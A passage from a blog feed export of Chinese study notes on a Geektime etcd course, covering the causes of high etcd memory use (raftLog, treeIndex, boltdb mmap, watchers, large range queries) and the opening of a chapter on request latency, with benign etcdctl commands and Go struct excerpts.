3.1到etcd 3.4版本，分别进行过几次重大优化，在下一节中我将和你介绍。</p><p>以上就是一个开启密码鉴权场景，线性读请求的性能瓶颈分析过程。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>优化读性能的核心思路是首先通过etcd clientv3自带的Round-robin负载均衡算法或者Load Balancer，尽量确保整个集群负载均衡。</p><p>然后，在开启鉴权场景时，建议尽量使用证书而不是密码认证，避免校验密码的昂贵开销。</p><p>其次，根据业务场景选择合适的读模式，串行读比线性度性能提高30%以上，延时降低一倍。线性读性能受节点之间RTT延时、磁盘IO延时、当前写QPS等多重因素影响。</p><p>最容易被大家忽视的就是写QPS对读QPS的影响，我通过一系列压测数据，整理成一个表格，让你更直观感受写QPS对读性能的影响。多可用区部署会导致节点RTT延时增高，读性能下降。因此你需要在高可用和高性能上做取舍和平衡。</p><p>最后在访问数据前，读性能还可能会受授权性能、expensive read request、treeIndex及boltdb的锁等影响。你需要遵循最佳实践，避免一个请求查询大量key、大key-value等，否则会导致读性能剧烈下降。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>15.内存：为什么你的etcd内存占用那么高？</title>
    <link href="/2022/10/07/15-%E5%86%85%E5%AD%98%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84etcd%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E9%82%A3%E4%B9%88%E9%AB%98%EF%BC%9F/"/>
    <url>/2022/10/07/15-%E5%86%85%E5%AD%98%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84etcd%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E9%82%A3%E4%B9%88%E9%AB%98%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="15-内存：为什么你的etcd内存占用那么高？"><a href="#15-内存：为什么你的etcd内存占用那么高？" class="headerlink" title="15.内存：为什么你的etcd内存占用那么高？"></a>15.内存：为什么你的etcd内存占用那么高？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在使用etcd的过程中，你是否被异常内存占用等现象困扰过？比如etcd中只保存了1个1MB的key-value，但是经过若干次修改后，最终etcd内存可能达到数G。它是由什么原因导致的？如何分析呢？</p><p>今天要分享的主题：etcd的内存。 帮助你掌握etcd内存抖动、异常背后的常见原因和分析方法，当遇到类似问题时，能独立定位、解决。同时，帮助在实际业务场景中，为集群节点配置充足的内存资源，遵循最佳实践，尽量减少expensive request，避免etcd内存出现突增，导致OOM。</p><h2 id="分析整体思路"><a href="#分析整体思路" class="headerlink" title="分析整体思路"></a>分析整体思路</h2><p>当遇到etcd内存占用较高的案例时，你脑海中第一反应是什么呢？</p><p>下图以etcd写请求流程为例，总结的可能导致etcd内存占用较高的核心模块与其数据结构。</p><p><img src="https://static001.geekbang.org/resource/image/c2/49/c2673ebb2db4b555a9fbe229ed1bda49.png?wh=1920*1056" alt="img"></p><p>从图中可以看到，当etcd收到一个写请求后，gRPC Server会建立连接。连接数越多，会导致etcd进程的fd、goroutine等资源上涨，因此会使用越来越多的内存。</p><p>其次，基于Raft知识背景，它需要将此请求的日志条目保存在raftLog里面。etcd raftLog后端实现是内存存储，核心就是数组。因此raftLog使用的内存与其保存的日志条目成正比，它也是内存分析过程中最容易被忽视的一个数据结构。</p><p>然后当此日志条目被集群多数节点确认后，在应用到状态机的过程中，会在内存treeIndex模块的B-tree中创建、更新key与版本号信息。 在这过程中treeIndex模块的B-tree使用的内存与key、历史版本号数量成正比。</p><p>更新完treeIndex模块的索引信息后，etcd将key-value数据持久化存储到boltdb。boltdb使用了mmap技术，将db文件映射到操作系统内存中。因此在未触发操作系统将db对应的内存page换出的情况下，etcd的db文件越大，使用的内存也就越大。</p><p>同时，在这个过程中还有两个注意事项。</p><p>一方面，其他client可能会创建若干watcher、监听这个写请求涉及的key， etcd也需要使用一定的内存维护watcher、推送key变化监听的事件。</p><p>另一方面，如果这个写请求的key还关联了Lease，Lease模块会在内存中使用数据结构Heap来快速淘汰过期的Lease，因此Heap也是一个占用一定内存的数据结构。</p><p>最后，不仅仅是写请求流程会占用内存，读请求本身也会导致内存上升。尤其是expensive request，当产生大包查询时，MVCC模块需要使用内存保存查询的结果，很容易导致内存突增。</p><p>基于以上读写流程图对核心数据结构使用内存的分析，我们定位问题时就有线索、方法可循了。那如何确定是哪个模块、场景导致的内存异常呢？</p><p>接下来通过一个实际案例，深入介绍下内存异常的分析方法。</p><h2 id="一个key使用数G内存的案例"><a href="#一个key使用数G内存的案例" class="headerlink" title="一个key使用数G内存的案例"></a>一个key使用数G内存的案例</h2><p>我们通过goreman启动一个3节点etcd集群(linux&#x2F;etcd v3.4.9)，db quota为6G，执行如下的命令并观察etcd内存占用情况：</p><ul><li>执行1000次的put同一个key操作，value为1MB；</li><li>更新完后并进行compact、defrag操作；</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># put同一个key，执行1000次</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1<span class="hljs-built_in">..</span>1000&#125;; <span class="hljs-keyword">do</span> dd <span class="hljs-attribute">if</span>=/dev/urandom <span class="hljs-attribute">bs</span>=1024<br><span class="hljs-attribute">count</span>=1024  | <span class="hljs-attribute">ETCDCTL_API</span>=3 etcdctl put key  || break; done<br><br><span class="hljs-comment"># 获取最新revision，并压缩</span><br>etcdctl compact `(etcdctl endpoint status <span class="hljs-attribute">--write-out</span>=<span class="hljs-string">&quot;json&quot;</span> | egrep -o <span class="hljs-string">&#x27;&quot;revision&quot;:[0-9]*&#x27;</span> | egrep -o <span class="hljs-string">&#x27;[0-9].*&#x27;</span>)`<br><br><span class="hljs-comment"># 对集群所有节点进行碎片整理</span><br>etcdctl defrag --cluster<br><br></code></pre></td></tr></table></figure><p>在执行操作前，空集群etcd db size 20KB，etcd进程内存36M左右，分别如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/c1/e6/c1fb89ae1d6218a66cf1db30c41d9be6.png?wh=1164*358" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/6c/6d/6ce074583f39cd9a19bdcb392133426d.png?wh=1318*420" alt="img"></p><p>预测执行1000次同样key更新后，etcd进程占用了多少内存呢? 约37M？ 1G？ 2G？3G？ 还是其他呢？</p><p>执行1000次的put操作后，db大小和etcd内存占用分别如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/d6/45/d6dc86f76f52dfed73ab1771ebbbf545.png?wh=1302*348" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/9d/70/9d97762851c18a0c4cd89aa5a7bb0270.png?wh=1310*404" alt="img"></p><p>当执行compact、defrag命令后，如下图所示，db大小只有1M左右，但是会发现etcd进程实际却仍占用了2G左右内存。</p><p><img src="https://static001.geekbang.org/resource/image/93/bd/937c3fb0bf12595928e8ae4b05b7a5bd.png?wh=1260*354" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/8d/58/8d2d9fb3c0193745d80fe68b0cb4a758.png?wh=1276*406" alt="img"></p><p>整个集群只有一个key，为什么etcd占用了这么多的内存呢？是etcd发生了内存泄露吗？接下来进行原因分析</p><h2 id="raftLog"><a href="#raftLog" class="headerlink" title="raftLog"></a>raftLog</h2><p>当发起一个put请求的时候，etcd需通过Raft模块将此请求同步到其他节点，详细流程可结合下图再次了解下。</p><p><img src="https://static001.geekbang.org/resource/image/df/2c/df9yy18a1e28e18295cfc15a28cd342c.png?wh=1920*1328" alt="img"></p><p>从图中可以看到，Raft模块的输入是一个消息&#x2F;Msg，输出统一为Ready结构。etcd会把此请求封装成一个消息，提交到Raft模块。</p><p>Raft模块收到此请求后，会把此消息追加到raftLog的unstable存储的entry内存数组中（图中流程2），并且将待持久化的此消息封装到Ready结构内，通过管道通知到etcdserver（图中流程3）。</p><p>etcdserver取出消息，持久化到WAL中，并追加到raftLog的内存存储storage的entry数组中（图中流程5）。</p><p>下面是 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/raft/log.go#L24:L45">raftLog</a> 的核心数据结构，它由storage、unstable、committed、applied等组成。storage存储已经持久化到WAL中的日志条目，unstable存储未持久化的条目和快照，一旦持久化会及时删除日志条目，因此不存在过多内存占用的问题。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">type</span> raftLog struct &#123;<br>   // <span class="hljs-keyword">storage</span> contains <span class="hljs-keyword">all</span> <span class="hljs-keyword">stable</span> entries since the last <span class="hljs-keyword">snapshot</span>.<br>   <span class="hljs-keyword">storage</span> <span class="hljs-keyword">Storage</span><br><br>   // unstable contains <span class="hljs-keyword">all</span> unstable entries <span class="hljs-keyword">and</span> <span class="hljs-keyword">snapshot</span>.<br>   // they will be saved <span class="hljs-keyword">into</span> <span class="hljs-keyword">storage</span>.<br>   unstable unstable<br><br>   // <span class="hljs-keyword">committed</span> <span class="hljs-keyword">is</span> the highest <span class="hljs-keyword">log</span> position that <span class="hljs-keyword">is</span> known <span class="hljs-keyword">to</span> be <span class="hljs-keyword">in</span><br>   // <span class="hljs-keyword">stable</span> <span class="hljs-keyword">storage</span> <span class="hljs-keyword">on</span> a quorum <span class="hljs-keyword">of</span> nodes.<br>   <span class="hljs-keyword">committed</span> uint64<br>   // applied <span class="hljs-keyword">is</span> the highest <span class="hljs-keyword">log</span> position that the application has<br>   // been instructed <span class="hljs-keyword">to</span> apply <span class="hljs-keyword">to</span> its state machine.<br>   // Invariant: applied &lt;= <span class="hljs-keyword">committed</span><br>   applied uint64<br>&#125;<br><br></code></pre></td></tr></table></figure><p>从上面raftLog结构体中，可以看到，存储稳定的日志条目的storage类型是Storage，Storage定义了存储Raft日志条目的核心API接口，业务应用层可根据实际场景进行定制化实现。etcd使用的是Raft算法库本身提供的MemoryStorage，其定义如下，核心是使用了一个数组来存储已经持久化后的日志条目。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// MemoryStorage implements the Storage interface backed</span><br><span class="hljs-comment">// by an in-memory array.</span><br>type MemoryStorage struct &#123;<br>   <span class="hljs-comment">// Protects access to all fields. Most methods of MemoryStorage are</span><br>   <span class="hljs-comment">// run on the raft goroutine， but Append() is run on an application</span><br>   <span class="hljs-comment">// goroutine.</span><br>   sync<span class="hljs-selector-class">.Mutex</span><br><br>   hardState pb<span class="hljs-selector-class">.HardState</span><br>   snapshot  pb<span class="hljs-selector-class">.Snapshot</span><br>   <span class="hljs-comment">// ents[i] has raftLog position i+snapshot.Metadata.Index</span><br>   ents <span class="hljs-selector-attr">[]</span>pb<span class="hljs-selector-class">.Entry</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>那么随着写请求增多，内存中保留的Raft日志条目会越来越多，如何防止etcd出现OOM呢？</p><p>etcd提供了<strong>快照和压缩</strong>功能来解决这个问题。</p><p>首先可以通过调整–snapshot-count参数来控制生成快照的频率，其值默认是100000（etcd v3.4.9，早期etcd版本是10000），也就是每10万个写请求触发一次快照生成操作。</p><p>快照生成完之后，etcd会通过压缩来删除旧的日志条目。</p><p>那么是全部删除日志条目还是保留一小部分呢？</p><p>答案是保留一小部分Raft日志条目。数量由DefaultSnapshotCatchUpEntries参数控制，默认5000，目前不支持自定义配置。</p><p>保留一小部分日志条目其实是为了帮助慢的Follower以较低的开销向Leader获取Raft日志条目，以尽快追上Leader进度。若raftLog中不保留任何日志条目，就只能发送快照给慢的Follower，这开销就非常大了。</p><p>通过以上分析可知，如果你的请求key-value比较大，比如上面我们的案例中是1M，1000次修改，那么etcd raftLog至少会消耗1G的内存。这就是为什么内存随着写请求修改次数不断增长的原因。</p><p>除了raftLog占用内存外，MVCC模块的treeIndex&#x2F;boltdb模块又是如何使用内存的呢？</p><h2 id="treeIndex"><a href="#treeIndex" class="headerlink" title="treeIndex"></a>treeIndex</h2><p>一个put写请求的日志条目被集群多数节点确认提交后，这时etcdserver就会从Raft模块获取已提交的日志条目，应用到MVCC模块的treeIndex和boltdb。</p><p>我们知道treeIndex是基于google内存btree库实现的一个索引管理模块，在etcd中每个key都会在treeIndex中保存一个索引项(keyIndex)，记录你的key和版本号等信息，如下面的数据结构所示。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">type</span> keyIndex <span class="hljs-keyword">struct</span> &#123;<br>   <span class="hljs-built_in">key</span>         []byte<br>   modified    revision <span class="hljs-comment">// the main rev of the last modification</span><br>   generations []generation<br>&#125;<br><br></code></pre></td></tr></table></figure><p>同时，每次对key的修改、删除操作都会在key的索引项中追加一条修改记录(revision)。因此，随着修改次数的增加，etcd内存会一直增加。那么如何清理旧版本，防止过多的内存占用呢？</p><p>答案也是压缩。当你执行compact命令时，etcd会遍历treeIndex中的各个keyIndex，清理历史版本号记录与已删除的key，释放内存。</p><p>从上面的keyIndex数据结构我们可知，一个key的索引项内存开销跟你的key大小、保存的历史版本数、compact策略有关。为了避免内存索引项占用过多的内存，key的长度不应过长，同时需要配置好合理的压缩策略。</p><h2 id="boltdb"><a href="#boltdb" class="headerlink" title="boltdb"></a>boltdb</h2><p>在treeIndex模块中创建、更新完keyIndex数据结构后，你的key-value数据、各种版本号、lease等相关信息会保存到如下的一个mvccpb.keyValue结构体中。它是boltdb的value，key则是treeIndex中保存的版本号，然后通过boltdb的写接口保存到db文件中。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts">kv := mvccpb.KeyValue<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">   Key:</span>            key，<br><span class="hljs-symbol">   Value:</span>          value，<br><span class="hljs-symbol">   CreateRevision:</span> c，<br><span class="hljs-symbol">   ModRevision:</span>    rev，<br><span class="hljs-symbol">   Version:</span>        ver，<br><span class="hljs-symbol">   Lease:</span>          int64(leaseID)，<br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>前面介绍boltdb时，提到过etcd在启动时会通过mmap机制，将etcd db文件映射到etcd进程地址空间，并设置mmap的MAP_POPULATE flag，它会告诉Linux内核预读文件，让Linux内核将文件内容拷贝到物理内存中。</p><p>在节点内存足够的情况下，后续读请求可直接从内存中获取。相比read系统调用，mmap少了一次从page cache拷贝到进程内存地址空间的操作，因此具备更好的性能。</p><p>若etcd节点内存不足，可能会导致db文件对应的内存页被换出。当读请求命中的页未在内存中时，就会产生缺页异常，导致读过程中产生磁盘IO。这样虽然避免了etcd进程OOM，但是此过程会产生较大的延时。</p><p>从以上boltdb的key-value和mmap机制介绍中我们可知，我们应控制boltdb文件大小，优化key-value大小，配置合理的压缩策略，回收旧版本，避免过多内存占用。</p><h2 id="watcher"><a href="#watcher" class="headerlink" title="watcher"></a>watcher</h2><p>在写入key的时候，其他client还可通过etcd的Watch监听机制，获取到key的变化事件。</p><p>那创建一个watcher耗费的内存跟哪些因素有关呢?</p><p>在Watch机制设计与实现分析中，介绍过创建watcher的整体流程与架构，如下图所示。当创建一个watcher时，client与server建立连接后，会创建一个gRPC Watch Stream，随后通过这个gRPC Watch Stream发送创建watcher请求。</p><p>每个gRPC Watch Stream中etcd WatchServer会分配两个goroutine处理，一个是sendLoop，它负责Watch事件的推送。一个是recvLoop，负责接收client的创建、取消watcher请求消息。</p><p>同时对每个watcher来说，etcd的WatchableKV模块需将其保存到相应的内存管理数据结构中，实现可靠的Watch事件推送。</p><p><img src="https://static001.geekbang.org/resource/image/42/bf/42575d8d0a034e823b8e48d4ca0a49bf.png?wh=1920*1075" alt="img"></p><p>因此watch监听机制耗费的内存跟client连接数、gRPC Stream、watcher数(watching)有关，如下面公式所示：</p><ul><li>c1表示每个连接耗费的内存；</li><li>c2表示每个gRPC Stream耗费的内存；</li><li>c3表示每个watcher耗费的内存。</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">memory</span> = <span class="hljs-built_in">c1</span> * number_of_conn + <span class="hljs-built_in">c2</span> *<br><span class="hljs-symbol">avg_number_of_stream_per_conn</span> + <span class="hljs-built_in">c3</span> *<br><span class="hljs-symbol">avg_number_of_watch_stream</span><br><br></code></pre></td></tr></table></figure><p>根据etcd社区的 <a href="https://etcd.io/docs/v3.4.0/benchmarks/etcd-3-watch-memory-benchmark/">压测报告</a>，大概估算出Watch机制中c1、c2、c3占用的内存分别如下：</p><ul><li>每个client连接消耗大约17kb的内存(c1)；</li><li>每个gRPC Stream消耗大约18kb的内存(c2)；</li><li>每个watcher消耗大约350个字节(c3)；</li></ul><p>当业务场景大量使用watcher的时候，应提前估算下内存容量大小，选择合适的内存配置节点。</p><p>注意以上估算并不包括watch事件堆积的开销。变更事件较多，服务端、客户端高负载，网络阻塞等情况都可能导致事件堆积。</p><p>在etcd 3.4.9版本中，每个watcher默认buffer是1024。buffer内保存watch响应结果，如watchID、watch事件（watch事件包含key、value）等。</p><p>若大量事件堆积，将产生较高昂的内存的开销。你可以通过etcd_debugging_mvcc_pending_events_total指标监控堆积的事件数，etcd_debugging_slow_watcher_total指标监控慢的watcher数，来及时发现异常。</p><h2 id="expensive-request"><a href="#expensive-request" class="headerlink" title="expensive request"></a>expensive request</h2><p>当写入比较大的key-value后，如果client频繁查询它，也会产生高昂的内存开销。</p><p>假设写入了100个这样1M大小的key， 通过Range接口一次查询100个key， 那么boltdb遍历、反序列化过程将花费至少100MB的内存。如下面代码所示，它会遍历整个key-value，将key-value保存到数组kvs中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">kvs := <span class="hljs-built_in">make</span>([]mvccpb.KeyValue， limit)<br>revBytes := newRevBytes()<br><span class="hljs-keyword">for</span> i， revpair := <span class="hljs-keyword">range</span> revpairs[:<span class="hljs-built_in">len</span>(kvs)] &#123;<br>   revToBytes(revpair， revBytes)<br>   _， vs := tr.tx.UnsafeRange(keyBucketName， revBytes， <span class="hljs-literal">nil</span>， <span class="hljs-number">0</span>)<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vs) != <span class="hljs-number">1</span> &#123;<br>        ......<br>   &#125;<br>   <span class="hljs-keyword">if</span> err := kvs[i].Unmarshal(vs[<span class="hljs-number">0</span>]); err != <span class="hljs-literal">nil</span> &#123;<br>        .......<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>也就是说，一次查询就耗费了至少100MB的内存、产生了至少100MB的流量，随着QPS增大后，很容易OOM、网卡出现丢包。</p><p>count-only、limit查询在key百万级以上时，也会产生非常大的内存开销。因为它们在遍历treeIndex的过程中，会将相关key保存在数组里面。当key多时，此开销不容忽视。</p><h2 id="etcd-v2-x2F-goroutines-x2F-bug"><a href="#etcd-v2-x2F-goroutines-x2F-bug" class="headerlink" title="etcd v2&#x2F;goroutines&#x2F;bug"></a>etcd v2&#x2F;goroutines&#x2F;bug</h2><p>除了以上介绍的核心模块、expensive request场景可能导致较高的内存开销外，还有以下场景也会导致etcd内存使用较高。</p><p>首先是 <strong>etcd中使用了v2的API写入了大量的key-value数据</strong>，这会导致内存飙高。etcd v2的key-value都是存储在内存树中的，同时v2的watcher不支持多路复用，内存开销相比v3多了一个数量级。</p><p>在etcd 3.4版本之前，etcd默认同时支持etcd v2&#x2F;v3 API，etcd 3.4版本默认关闭了v2 API。 可以通过etcd v2 API和etcd v2内存存储模块的metrics前缀etcd_debugging_store，观察集群中是否有v2数据导致的内存占用高。</p><p>其次是 <strong>goroutines泄露</strong> 导致内存占用高。此问题可能会在容器化场景中遇到。etcd在打印日志的时候，若出现阻塞则可能会导致goroutine阻塞并持续泄露，最终导致内存泄露。可以通过观察、监控go_goroutines来发现这个问题。</p><p>最后是 <strong>etcd bug</strong> 导致的内存泄露。当基本排除以上场景导致的内存占用高后，则很可能是etcd bug导致的内存泄露。</p><p>比如早期etcd clientv3的lease keepalive租约频繁续期bug，它会导致Leader高负载、内存泄露，此bug已在3.2.24&#x2F;3.3.9版本中修复。</p><p>若内存泄露并不是已知的etcd bug导致，可以开启pprof， 尝试复现，通过分析pprof heap文件来确定消耗大量内存的模块和数据结构。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过一个写入1MB key的实际案例，介绍了可能导致etcd内存占用高的核心数据结构、场景，将可能导致内存占用较高的因素总结为了下面这幅图。</p><p><img src="https://static001.geekbang.org/resource/image/aa/90/aaf7b4f5f6f568dc70c1a0964fb92790.png?wh=1920*684" alt="img"></p><p>首先是raftLog。为了帮助slow Follower同步数据，它至少要保留5000条最近收到的写请求在内存中。若key非常大，更新5000次会产生较大的内存开销。</p><p>其次是treeIndex。 每个key-value会在内存中保留一个索引项。索引项的开销跟key长度、保留的历史版本有关，可以通过compact命令压缩。</p><p>然后是boltdb。etcd启动的时候，会通过mmap系统调用，将文件映射到虚拟内存中。可以通过compact命令回收旧版本，defrag命令进行碎片整理。</p><p>接着是watcher。它的内存占用跟连接数、gRPC Watch Stream数、watcher数有关。watch机制一个不可忽视的内存开销其实是事件堆积的占用缓存，可以通过相关metrics及时发现堆积的事件以及slow watcher。</p><p>最后介绍了一些典型的场景导致的内存异常，如大包查询等expensive request，etcd中存储了v2 API写入的key， goroutines泄露以及etcd lease bug等。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>14.延时：为什么你的etcd请求会出现超时？</title>
    <link href="/2022/10/07/14-%E5%BB%B6%E6%97%B6%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84etcd%E8%AF%B7%E6%B1%82%E4%BC%9A%E5%87%BA%E7%8E%B0%E8%B6%85%E6%97%B6%EF%BC%9F/"/>
    <url>/2022/10/07/14-%E5%BB%B6%E6%97%B6%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84etcd%E8%AF%B7%E6%B1%82%E4%BC%9A%E5%87%BA%E7%8E%B0%E8%B6%85%E6%97%B6%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="14-延时：为什么你的etcd请求会出现超时？"><a href="#14-延时：为什么你的etcd请求会出现超时？" class="headerlink" title="14.延时：为什么你的etcd请求会出现超时？"></a>14.延时：为什么你的etcd请求会出现超时？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在使用etcd的过程中，经常会被日志中的”apply request took too long”和“etcdserver: request timed out”等高延时现象困扰过？它们是由什么原因导致的呢？我们应该如何来分析这些问题？</p><p>这就是要分享的主题：etcd延时。掌握etcd延时抖动、超时背后的常见原因和分析方法，当遇到类似问题时，能独立定位、解决。同时，在实际业务场景中，合理配置集群，遵循最佳实践，尽量减少expensive request，避免etcd请求出现超时。</p><h2 id="分析思路及工具"><a href="#分析思路及工具" class="headerlink" title="分析思路及工具"></a>分析思路及工具</h2><p>首先，当面对一个高延时的请求案例后，如何梳理问题定位思路呢？</p><p>知彼知己，方能百战不殆，定位问题也是类似。首先我们得弄清楚产生问题的原理、流程，读写请求的核心链路。其次是熟练掌握相关工具，借助它们，可以帮助我们快速攻破疑难杂症。</p><p>Leader收到一个写请求，将一个日志条目复制到集群多数节点并应用到存储状态机的流程（如下图所示），通过此图看看写流程上哪些地方可能会导致请求超时呢？</p><p><img src="https://static001.geekbang.org/resource/image/df/2c/df9yy18a1e28e18295cfc15a28cd342c.png?wh=1920*1328" alt="img"></p><p>首先是流程四，一方面，Leader需要并行将消息通过网络发送给各Follower节点，依赖网络性能。另一方面，Leader需持久化日志条目到WAL，依赖磁盘I&#x2F;O顺序写入性能。</p><p>其次是流程八，应用日志条目到存储状态机时，etcd后端key-value存储引擎是boltdb。正如之前 所介绍的，它是一个基于B+ tree实现的存储引擎，当你写入数据，提交事务时，它会将dirty page持久化到磁盘中。在这过程中boltdb会产生磁盘随机I&#x2F;O写入，因此事务提交性能依赖磁盘I&#x2F;O随机写入性能。</p><p>最后，在整个写流程处理过程中，etcd节点的CPU、内存、网络带宽资源应充足，否则肯定也会影响性能。</p><p>初步了解完可能导致延时抖动的瓶颈处之后，我给你总结了etcd问题定位过程中常用的工具，你可以参考下面这幅图。</p><p><img src="https://static001.geekbang.org/resource/image/b5/fc/b5bb69c8effda97f2ef78b067ab1aafc.png?wh=1920*1300" alt="img"></p><p>图的左边是读写请求链路中可能出现瓶颈或异常的点，比如上面流程分析中提到的磁盘、内存、CPU、网络资源。</p><p>图的右边是常用的工具，分别是metrics、trace日志、etcd其他日志、WAL及boltdb分析工具等。</p><p>接下来，基于读写请求的核心链路和其可能出现的瓶颈点，结合相关的工具，深入分析etcd延时抖动的定位方法和原因。</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>首先看看流程图中第一个提到可能瓶颈点，网络模块。</p><p>在etcd中，各个节点之间需要通过2380端口相互通信，以完成Leader选举、日志同步等功能，因此底层网络质量（吞吐量、延时、稳定性）对上层etcd服务的性能有显著影响。</p><p>网络资源出现异常的常见表现是连接闪断、延时抖动、丢包等。那么我们要如何定位网络异常导致的延时抖动呢？</p><p>一方面，可以使用常规的ping&#x2F;traceroute&#x2F;mtr、ethtool、ifconfig&#x2F;ip、netstat、tcpdump网络分析工具等命令，测试网络的连通性、延时，查看网卡的速率是否存在丢包等错误，确认etcd进程的连接状态及数量是否合理，抓取etcd报文分析等。</p><p>另一方面，etcd应用层提供了节点之间网络统计的metrics指标，分别如下：</p><ul><li>etcd_network_active_peer，表示peer之间活跃的连接数；</li><li>etcd_network_peer_round_trip_time_seconds，表示peer之间RTT延时；</li><li>etcd_network_peer_sent_failures_total，表示发送给peer的失败消息数；</li><li>etcd_network_client_grpc_sent_bytes_total，表示server发送给client的总字节数，通过这个指标我们可以监控etcd出流量；</li><li>etcd_network_client_grpc_received_bytes_total，表示server收到client发送的总字节数，通过这个指标可以监控etcd入流量。</li></ul><p>client入流量监控如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/26/ff/26617a4c08e7c1e155c4332058451cff.png?wh=866*356" alt="img"></p><p>client出流量如下图监控所示。 从图中你可以看到，峰值接近140MB&#x2F;s(1.12Gbps)，这是非常不合理的，说明业务中肯定有大量expensive read request操作。若etcd集群读写请求开始出现超时，你可以用ifconfig等命令查看是否出现丢包等错误。</p><p><img src="https://static001.geekbang.org/resource/image/4c/0b/4c8659e621305200b8f761b1e319460b.png?wh=856*356" alt="img"></p><p>etcd metrics指标名由namespace和subsystem、name组成。namespace为etcd， subsystem是模块名（比如network、name具体的指标名）。你可以在Prometheus里搜索etcd_network找到所有network相关的metrics指标名。</p><p>下面是一个集群中某节点异常后的metrics指标：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">etcd_network_active_peers&#123;Local<span class="hljs-operator">=</span><span class="hljs-string">&quot;fd422379fda50e48&quot;</span>，Remote<span class="hljs-operator">=</span><span class="hljs-string">&quot;8211f1d0f64f3269&quot;</span>&#125; <span class="hljs-number">1</span><br>etcd_network_active_peers&#123;Local<span class="hljs-operator">=</span><span class="hljs-string">&quot;fd422379fda50e48&quot;</span>，Remote<span class="hljs-operator">=</span><span class="hljs-string">&quot;91bc3c398fb3c146&quot;</span>&#125; <span class="hljs-number">0</span><br>etcd_network_peer_sent_failures_total&#123;To<span 